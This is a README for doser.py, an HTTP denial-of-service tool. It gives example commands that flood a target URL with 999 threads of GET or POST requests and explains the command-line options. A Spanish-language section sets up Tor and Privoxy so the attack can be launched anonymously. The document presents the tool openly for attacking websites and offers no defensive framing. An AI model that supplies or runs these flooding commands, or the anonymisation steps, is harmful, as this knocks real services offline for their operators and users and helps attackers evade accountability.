# doser.py
DoS tool for HTTP requests (inspired by hulk but has more functionalities) written in Python:
![](https://raw.githubusercontent.com/Quitten/doser.py/master/doser.jpg)

# Examples
999 threads sends GET requests:

```bash
python doser.py -t 999 -g 'https://targeted.site.com'
```

999 threads sends POST requests with json data:

```bash
python doser.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
```

# Usage
usage: doser.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]

optional arguments:

  -h, --help  show this help message and exit
  
  -g        Specify GET request. Usage: -g '< url >'
  
  -p        Specify POST request. Usage: -p '< url >'
  
  -d        Specify data payload for POST request
  
  -ah      Specify addtional header
  
  -t        Specify number of threads to be used
  
  
# Pasos para usar doser.py anonimamente
1-instalar tor

apt-get install tor

2-instalar privoxy

apt-get install privoxy

Editar el archivo /etc/privoxy/config

descomentar las siguientes lineas:
listen-address 127.0.0.1:8118
listen-address [::1]:8118
forward-socks5t / 127.0.0.1:9050 .

3-clonar el siguiente repositorio:
git clone https://github.com/robertofocke/doser.py

4-lanzar el ataque con “python doser-proxy.py”
